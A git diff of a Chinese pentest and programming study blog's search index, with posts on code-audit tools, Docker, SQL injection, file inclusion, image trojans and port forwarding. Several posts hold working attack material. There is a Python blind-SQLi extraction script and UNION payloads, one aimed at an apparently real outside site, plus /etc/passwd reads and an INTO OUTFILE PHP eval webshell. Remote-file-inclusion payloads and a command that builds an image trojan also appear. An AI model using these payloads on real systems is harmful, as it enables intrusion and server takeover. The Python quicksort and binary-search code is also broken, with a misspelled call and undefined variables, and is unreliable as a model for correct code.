@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[代码审计]]></title>
+    <url>%2F2019%2F12%2F26%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
+    <content type="text"><![CDATA[代码审计简介顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。 工具源代码审计工具通常会查找常见漏洞，仅适用于特定的编程语言。 这种自动化工具可用于节省时间，但不应依赖于深入审计。 建议将这些工具作为基于政策的方法的一部分。 PHP代码审计RIPS下载地址：https://sourceforge.net/projects/rips-scanner Java代码审计findbugs下载地址：http://findbugs.sourceforge.net/downloads.htmlhttps://find-sec-bugs.github.io/ Pythonbandit下载地址：https://github.com/openstack/bandit py-find-injection下载地址：https://github.com/uber/py-find-injection pyt下载地址：https://github.com/python-security/pyt .netSecurity Code Scan下载地址：https://security-code-scan.github.io/ C++flawfinder下载地址：https://sourceforge.net/projects/flawfinder/ JSNodeJsScan下载地址：https://github.com/ajinabraham/NodeJsScan 商业工具静态RISP，VCG，Fortify SCA 动态360-sky wolf鸟哥-taintCobra-https://github.com/WhaleShark-Team/cobra]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[docker]]></title>
     <url>%2F2019%2F12%2F25%2Fdocker%2F</url>
     <content type="text"><![CDATA[docker常用命令Code123456789docker search [镜像名] //搜索镜像docker pull [镜像名] //下载镜像docker images //查看已下载的镜像docker ps -a //查看所有容器docker stop [容器名] //停止容器docker stop $(docker ps -aq) //停止容器docker rm [容器名] //删除容器docker rmi [镜像名] //删除镜像docker run [容器名] IMAGE //创建容器 run命令详解见:https://www.cnblogs.com/yfalcon/p/9044246.html docker搭建中的问题IPv4 forwarding is disabled. Networking will not workCode12345678910111213修改/etc/sysctl.conf或者/usr/lib/sysctl.d/00-system.conf添加如下代码：net.ipv4.ip_forward=1然后重启网络：systemctl restart network查看是否添加成功：sysctl net.ipv4.ip_forward输出为1时证明成功在宿主机上执行：net.ipv4.ip_forward=1 &gt;&gt; /usr/lib/sysctl.d/00-system.conf重启network和docker服务systemctl restart network &amp;&amp; systemctl restart docker 无法使用 systemctl 命令创建容器时加上：–privileged=true Code1234567Centos 7docker run -tid --name test_1 --privileged=true /usr/sbin/initdocker exec -it test_1 /bin/bashUbunut 16.04docker run -tid --name test_2 --privileged=true /sbin/initdocker exec -it test_2 /bin/bash]]></content>
@@ -12,22 +23,22 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[算法(Python)]]></title>
-    <url>%2F2019%2F09%2F10%2F%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%2F</url>
-    <content type="text"><![CDATA[算法快速排序Code12345678def quicksort(arr): if len(arr)&lt;2: return arr else: j = arr[0] begin = [i for i in arr[1:] if i &lt;= j] end = [i for i in arr[1:] if i &gt; j] return quciksort(begin) + j + quicksort(end) 二分查找Code123456789101112def find(arr,itme): low = 0 high = len(arr) - 1 while(low &lt;= high): mid = int((end-begin)/2) guess = arr[mid] if guess == itme: return mid if guess &gt; itme: high = mid - 1 else: low = mid + 1 bool注入Code123456789101112131415161718192021222324252627282930313233343536import requestsdef len_db(len_payload): for i in range(1,20): if(len(requests.get(len_payload+str(i)+item).text)==108): print(len_payload + str(i) + item+&quot;[*]&quot;) return i else: print(len_payload+str(i)+item)def buer(l): s=&quot;&quot; for i in range(l): payload = &quot;http://localhost/sql/?id=1&apos; and ascii(substr(database(),&quot;+str(i+1)+&quot;,1))&quot; s += chr(binary(payload)) print(s) return sdef binary(payload): low = 32 high = 127 while(low&lt;=high): mid = int((low+high)/2) if(len(requests.get(payload+&quot;=&quot;+str(mid)+item).text)==108): print(payload + &quot;=&quot; + str(mid) + item + &quot;[*]&quot;) return mid if(len(requests.get(payload+&quot;&lt;&quot;+str(mid)+item).text)==108): print(payload + &quot;&lt;&quot; + str(mid) + item) high = mid - 1 else: print(payload + &quot;&gt;&quot; + str(mid) + item) low = mid + 1if __name__ == &apos;__main__&apos;: url = &quot;http://localhost/sql/?id=11&quot; item = &quot;--+&quot; len_payload = &quot;http://localhost/sql/?id=1&apos; and length(database())=&quot; l = len_db(len_payload) db = buer(l)]]></content>
+    <title><![CDATA[博客标题]]></title>
+    <url>%2F2019%2F09%2F10%2FA%E6%A8%A1%E6%9D%BF%2F</url>
+    <content type="text"><![CDATA[测试:hiof测试分类进度非结算单 一级标题二级标题Code1代码块]]></content>
       <categories>
-        <category>算法</category>
+        <category>分类</category>
       </categories>
       <tags>
         <tag>标签</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[博客标题]]></title>
-    <url>%2F2019%2F09%2F10%2FA%E6%A8%A1%E6%9D%BF%2F</url>
-    <content type="text"><![CDATA[测试:hiof测试分类进度非结算单 一级标题二级标题Code1代码块]]></content>
+    <title><![CDATA[算法(Python)]]></title>
+    <url>%2F2019%2F09%2F10%2F%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%2F</url>
+    <content type="text"><![CDATA[算法快速排序Code12345678def quicksort(arr): if len(arr)&lt;2: return arr else: j = arr[0] begin = [i for i in arr[1:] if i &lt;= j] end = [i for i in arr[1:] if i &gt; j] return quciksort(begin) + j + quicksort(end) 二分查找Code123456789101112def find(arr,itme): low = 0 high = len(arr) - 1 while(low &lt;= high): mid = int((end-begin)/2) guess = arr[mid] if guess == itme: return mid if guess &gt; itme: high = mid - 1 else: low = mid + 1 bool注入Code123456789101112131415161718192021222324252627282930313233343536import requestsdef len_db(len_payload): for i in range(1,20): if(len(requests.get(len_payload+str(i)+item).text)==108): print(len_payload + str(i) + item+&quot;[*]&quot;) return i else: print(len_payload+str(i)+item)def buer(l): s=&quot;&quot; for i in range(l): payload = &quot;http://localhost/sql/?id=1&apos; and ascii(substr(database(),&quot;+str(i+1)+&quot;,1))&quot; s += chr(binary(payload)) print(s) return sdef binary(payload): low = 32 high = 127 while(low&lt;=high): mid = int((low+high)/2) if(len(requests.get(payload+&quot;=&quot;+str(mid)+item).text)==108): print(payload + &quot;=&quot; + str(mid) + item + &quot;[*]&quot;) return mid if(len(requests.get(payload+&quot;&lt;&quot;+str(mid)+item).text)==108): print(payload + &quot;&lt;&quot; + str(mid) + item) high = mid - 1 else: print(payload + &quot;&gt;&quot; + str(mid) + item) low = mid + 1if __name__ == &apos;__main__&apos;: url = &quot;http://localhost/sql/?id=11&quot; item = &quot;--+&quot; len_payload = &quot;http://localhost/sql/?id=1&apos; and length(database())=&quot; l = len_db(len_payload) db = buer(l)]]></content>
       <categories>
-        <category>分类</category>
+        <category>算法</category>
       </categories>
       <tags>
         <tag>标签</tag>
@@ -68,16 +79,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Network-Shell端口转发]]></title>
-    <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
-    <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
+    <title><![CDATA[文件包含漏洞]]></title>
+    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码Code12345if(isset($_GET[&apos;page&apos;]))&#123; include $_GET[&apos;page&apos;];&#125;else&#123; include &quot;one.php&quot;;&#125; 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>端口转发</tag>
-        <tag>内网渗透</tag>
-        <tag>工具</tag>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -94,15 +104,16 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[文件包含漏洞]]></title>
-    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码Code12345if(isset($_GET[&apos;page&apos;]))&#123; include $_GET[&apos;page&apos;];&#125;else&#123; include &quot;one.php&quot;;&#125; 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
+    <title><![CDATA[Network-Shell端口转发]]></title>
+    <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
+    <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
-        <tag>文件包含</tag>
+        <tag>端口转发</tag>
+        <tag>内网渗透</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -119,18 +130,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[SQL注入]]></title>
-    <url>%2F2019%2F08%2F16%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"><![CDATA[SQL注入 and 1=1 / and 1=2 回显页面不同（整形判断） 单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断） \ (转义符) -1/+1 回显下一个或上一个页面（整型判断） and sleep(5) UNION query SQL injection（可联合查询注入） 前提:页面上有显示位,缺点亦是页面上必须有显示位 优点:方便,快捷,易于利用 判断列数 : order by 4 (数值取到最大,页面显示正常,下一步判断显示位) 判断显示位 : php?id=-1 union select 1,2,3,4 //id=-1 让第一行无法正常显示,显示出显示位 http://www.asfaa.org/members.php?id=-3 union select 1,database(),3,group_concat(table_name) from information_schema.tables where table_schema=database() //爆出当前库所有表名 Error-based SQL injection（报错型注入） 页面上没有显示位,但是需要输出SQL语句执行错误信息( 比如:mysqli_error() ) 优点不需要显示位 通过floor报错 floor 通过 and extractvalue(1,payload) 报错 http://127.0.0.1/st/day02/baji/vul/user/show_error.php?id=1 and extractvalue(1,concat(0x27,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) //爆出所有表名 通过 and updatexml(1,payload,1)报错 与extractvalue(1,payload)相同 Boolean-based blind SQL injection（布尔型注入） 优点 : 不需要显示位,不需要报错信息 只能通过页面返回正常与否判断 , 速度慢 , 花费大量时间 常用的几个函数 : substr(‘user’,1,1) = u ascii(‘u’) =117 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 1 –+ //and 1 页面显示正常 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 0 –+ //and 0 页面无显示 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and length(database())=4 –+ 当length(database())=4时页面显示正常,证明数据库名是4个字符组成 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and substr(database(),1,1)=’b’ –+ and substr(database(),1,1)=’b’ 页面显示正常 , 证明当前数据库名的第一个字符为 ‘b’ 因为当substr(database(),1,1)=’b’成立时等价于1,后续更改substr()函数的参数及可获取完整数据库名,表名,列名操作相同 Time-based blind SQL injection（基于时间延迟注入） 不需要显示位,不需要出错信息 速度慢 , 耗费大量时间 原理与bool注入相同 if(条件,1,2)函数 : 当条件为真时返回1,为假时返回2 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and if(length(database())=4,sleep(4),1) –+ 当length(database())=4为真时 , 就等待4秒 Mysql注释 #(url编码为%23) – (–后面要跟上一个或多个空格:可用+号代替空格–+) /*…*/ /*!…*/ 内联注释 select * /*!222from*/ user; Mysql常用函数(配合select使用) user() 当前登录数据库的用户 database() 当前数据库 @@version 数据库版本 session_user() @@basedir 数据库安装路径 @@datadir 数据存放路径 @@version_complie_os 服务器操作系统 load_file() 读文件 知道文件绝对路径 能够使用union查询 对web目录有写入权限 UNION SELECT 1,load_file(‘/etc/passwd’),3,4,5,6 –+ UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6 –+ into outfile() 写文件操作 必须用绝对路径 用户必须有写入文件的权限 没有对’号过滤 SELECT ‘&lt;?php @eval($_POST[‘qwer’]);?&gt;‘ into outfile ‘c:\Windows\tmp\1.php’ concat(str1,str2) 连接字符串 str1str2 concat_ws(‘拼接分离的字符串’,str1,str2) -&gt; str1拼接分离的字符串str2 group_concat(select username from user) -&gt; username1,username2]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>Mysql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[TCP三次握手]]></title>
     <url>%2F2019%2F08%2F16%2FTCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%2F</url>
     <content type="text"><![CDATA[SYN,ACK,FIN存放在TCP的标志位,一共有6个字符,这里就介绍这三个： SYN 代表请求创建连接,所以在三次握手中前两次要SYN=1,表示这两次用于建立连接,至于第三次什么用,在疑问三里解答。 FIN 表示请求关闭连接,在四次分手时,我们发现FIN发了两遍。这是因为TCP的连接是双向的,所以一次FIN只能关闭一个方向。 ACK 代表确认接受,从上面可以发现,不管是三次握手还是四次分手,在回应的时候都会加上ACK=1,表示消息接收到了,并且在建立连接以后的发送数据时,都需加上ACK=1,来表示数据接收成功。 seq 序列号,什么意思呢？ 当发送一个数据时,数据是被拆成多个数据包来发送,序列号就是对每个数据包进行编号,这样接受方才能对数据包进行再次拼接 为什么需要四次分手？ TCP是双向的，所以需要在两个方向分别关闭，每个方向的关闭又需要请求和确认，所以一共就4次]]></content>
@@ -143,14 +142,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[图片马制作]]></title>
-    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
-    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
+    <title><![CDATA[SQL注入]]></title>
+    <url>%2F2019%2F08%2F16%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[SQL注入 and 1=1 / and 1=2 回显页面不同（整形判断） 单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断） \ (转义符) -1/+1 回显下一个或上一个页面（整型判断） and sleep(5) UNION query SQL injection（可联合查询注入） 前提:页面上有显示位,缺点亦是页面上必须有显示位 优点:方便,快捷,易于利用 判断列数 : order by 4 (数值取到最大,页面显示正常,下一步判断显示位) 判断显示位 : php?id=-1 union select 1,2,3,4 //id=-1 让第一行无法正常显示,显示出显示位 http://www.asfaa.org/members.php?id=-3 union select 1,database(),3,group_concat(table_name) from information_schema.tables where table_schema=database() //爆出当前库所有表名 Error-based SQL injection（报错型注入） 页面上没有显示位,但是需要输出SQL语句执行错误信息( 比如:mysqli_error() ) 优点不需要显示位 通过floor报错 floor 通过 and extractvalue(1,payload) 报错 http://127.0.0.1/st/day02/baji/vul/user/show_error.php?id=1 and extractvalue(1,concat(0x27,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) //爆出所有表名 通过 and updatexml(1,payload,1)报错 与extractvalue(1,payload)相同 Boolean-based blind SQL injection（布尔型注入） 优点 : 不需要显示位,不需要报错信息 只能通过页面返回正常与否判断 , 速度慢 , 花费大量时间 常用的几个函数 : substr(‘user’,1,1) = u ascii(‘u’) =117 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 1 –+ //and 1 页面显示正常 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 0 –+ //and 0 页面无显示 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and length(database())=4 –+ 当length(database())=4时页面显示正常,证明数据库名是4个字符组成 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and substr(database(),1,1)=’b’ –+ and substr(database(),1,1)=’b’ 页面显示正常 , 证明当前数据库名的第一个字符为 ‘b’ 因为当substr(database(),1,1)=’b’成立时等价于1,后续更改substr()函数的参数及可获取完整数据库名,表名,列名操作相同 Time-based blind SQL injection（基于时间延迟注入） 不需要显示位,不需要出错信息 速度慢 , 耗费大量时间 原理与bool注入相同 if(条件,1,2)函数 : 当条件为真时返回1,为假时返回2 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and if(length(database())=4,sleep(4),1) –+ 当length(database())=4为真时 , 就等待4秒 Mysql注释 #(url编码为%23) – (–后面要跟上一个或多个空格:可用+号代替空格–+) /*…*/ /*!…*/ 内联注释 select * /*!222from*/ user; Mysql常用函数(配合select使用) user() 当前登录数据库的用户 database() 当前数据库 @@version 数据库版本 session_user() @@basedir 数据库安装路径 @@datadir 数据存放路径 @@version_complie_os 服务器操作系统 load_file() 读文件 知道文件绝对路径 能够使用union查询 对web目录有写入权限 UNION SELECT 1,load_file(‘/etc/passwd’),3,4,5,6 –+ UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6 –+ into outfile() 写文件操作 必须用绝对路径 用户必须有写入文件的权限 没有对’号过滤 SELECT ‘&lt;?php @eval($_POST[‘qwer’]);?&gt;‘ into outfile ‘c:\Windows\tmp\1.php’ concat(str1,str2) 连接字符串 str1str2 concat_ws(‘拼接分离的字符串’,str1,str2) -&gt; str1拼接分离的字符串str2 group_concat(select username from user) -&gt; username1,username2]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>木马</tag>
+        <tag>SQL注入</tag>
+        <tag>Mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -163,6 +163,17 @@
       <tags>
         <tag>phpmyadmin</tag>
         <tag>Webshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[图片马制作]]></title>
+    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
       </tags>
   </entry>
   <entry>
@@ -202,18 +213,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[子网划分公式]]></title>
-    <url>%2F2019%2F07%2F10%2F%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%85%AC%E5%BC%8F%2F</url>
-    <content type="text"><![CDATA[Code12345678910112次方 十进制 二进制2^1=2 128 100000002^2=4 192 110000002^3=8 224 111000002^4=16 240 111100002^5=32 248 111110002^6=64 252 111111002^7=128 254 111111102^8=256 255 111111112^9=512 2^10=1024 子网划分中的3个公式：求可容纳的主机数 2的m次方-2 m表示子网中0的个数（是2进制）；-2表示一个网络地址，一个广播地址。 求可以划分的网段数 2的n次方 n表示“借位”的个数——-&gt;网络位向主机位借的“1”的个数。 求范围 256-X （X表示子网掩码中非255的数） 举例 一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机，要使用192.168.1.0/24来做地址划分4个不同的小网段。如何划分？ 原IP/MASK：192.168.1.0/24 2的n次方要小于等于子网个数 (2^n&gt;=4 n&gt;=2) 新的MASK 255.255.255.192 (11111111.11111111.11111111.11 000000) 256-192=64 Code12345范围：192.168.1.0 —— 192.168.1.63/26192.168.1.64 —— 192.168.1.127/26192.168.1.128 —— 192.168.1.191/26192.168.1.192 —— 192.168.1.255/26 反推网络地址和广播地址 111.243.77.191/11 思路： 现MASK – /11 255.111 00000.0.0 x=224 256-224=32Code123456范围：111.0.0.0 -- 111.31.255.255/11111.32.0.0 -- 111.63.255.255/11........243/32=7.....9111.32*7.0.0 -- 111.32*8-1.255.255/11111.224.0.0 -- 111.255.255.255/11]]></content>
-      <categories>
-        <category>Network</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-        <tag>子网划分</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[PHP-PDO]]></title>
     <url>%2F2019%2F07%2F10%2FPHP-PDO%2F</url>
     <content type="text"><![CDATA[开启PDOWindows 修改php.ini配置文件 添加 extension=php_pdo.dll Linux 添加扩展 extension=pdo.so 实例连接Code1234567891011121314151617181920212223242526&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;localhost&apos;; //数据库主机名$dbName=&apos;test&apos;; //使用的数据库$user=&apos;root&apos;; //数据库连接用户名$pass=&apos;&apos;; //对应的密码$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try &#123; $conn = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;; /*你还可以进行一次搜索操作 foreach ($conn-&gt;query(&apos;SELECT * from FOO&apos;) as $row) &#123; print_r($row); //你可以用 echo($GLOBAL); 来看到这些值 &#125; */ $conn = null;&#125; catch (PDOException $e) &#123; die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);&#125;//默认这个不是长连接，如果需要数据库长连接//需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true)//变成这样：$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt; 查询Code1234567$sql = &quot;SELECT * FROM user WHERE username = ? and password = ?&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$row = $stmt -&gt; fetchAll(); 添加数据Code1234567$sql = &quot;INSERT INTO user(username,password) VALUES(?,?)&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$count &gt; 0 //添加成功]]></content>
@@ -225,6 +224,18 @@
         <tag>函数</tag>
         <tag>PHP</tag>
         <tag>PDO</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[子网划分公式]]></title>
+    <url>%2F2019%2F07%2F10%2F%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%85%AC%E5%BC%8F%2F</url>
+    <content type="text"><![CDATA[Code12345678910112次方 十进制 二进制2^1=2 128 100000002^2=4 192 110000002^3=8 224 111000002^4=16 240 111100002^5=32 248 111110002^6=64 252 111111002^7=128 254 111111102^8=256 255 111111112^9=512 2^10=1024 子网划分中的3个公式：求可容纳的主机数 2的m次方-2 m表示子网中0的个数（是2进制）；-2表示一个网络地址，一个广播地址。 求可以划分的网段数 2的n次方 n表示“借位”的个数——-&gt;网络位向主机位借的“1”的个数。 求范围 256-X （X表示子网掩码中非255的数） 举例 一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机，要使用192.168.1.0/24来做地址划分4个不同的小网段。如何划分？ 原IP/MASK：192.168.1.0/24 2的n次方要小于等于子网个数 (2^n&gt;=4 n&gt;=2) 新的MASK 255.255.255.192 (11111111.11111111.11111111.11 000000) 256-192=64 Code12345范围：192.168.1.0 —— 192.168.1.63/26192.168.1.64 —— 192.168.1.127/26192.168.1.128 —— 192.168.1.191/26192.168.1.192 —— 192.168.1.255/26 反推网络地址和广播地址 111.243.77.191/11 思路： 现MASK – /11 255.111 00000.0.0 x=224 256-224=32Code123456范围：111.0.0.0 -- 111.31.255.255/11111.32.0.0 -- 111.63.255.255/11........243/32=7.....9111.32*7.0.0 -- 111.32*8-1.255.255/11111.224.0.0 -- 111.255.255.255/11]]></content>
+      <categories>
+        <category>Network</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>子网划分</tag>
       </tags>
   </entry>
   <entry>
